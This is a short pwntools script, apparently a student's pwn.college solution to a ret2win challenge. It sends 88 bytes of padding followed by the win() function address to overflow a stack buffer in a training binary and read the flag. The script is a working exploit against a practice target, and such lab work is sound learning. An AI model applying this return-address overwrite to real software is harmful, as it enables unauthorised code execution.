# Username: vasanth.vanan (pwn.college dojos)
# Title: Classwork challenge for ret2win 

# imported the 'pwntools' library
from pwn import *

# assigned the context for the binary analysis. This is usually the same for all challenges.
context.arch = 'amd64'

# 'ret2win' can be located at /challenge/ret2win. So, performed a local binary analysis with process() function.
p = process('/challenge/ret2win')

# 'elf' is a global variable which contains the ELF object for the binary. It retrieves context, symbols, entry point, etc.
elf = context.binary = ELF('/challenge/ret2win', checksec=False)

# if binary hosted on a remote server, we need to switch the context to remote.
# p = remote('dojos.pwn.college', 1234)

# assigned the log level to 'debug' for verbose output
context.log_level = 'DEBUG'

# assigned Offset for buffer overflow. This can be found by using the pattern search feature in GDB.
# generated the pattern with python: 'A' * 88. Got segmentation fault after sending it.
offset_value = 88

# constructed the payload with padding
# 88 bytes of 'A' + 8 bytes of win() function address - 0x00000000004011b6
payload = flat(b'A' * offset_value,elf.functions.win)

print(payload)

#write('payload', payload)

# Send the payload after the prompt 'groot?\n'.
p.sendlineafter(b'groot?\n', payload)

# Read the flag from the process.
flag = p.recvline().strip()
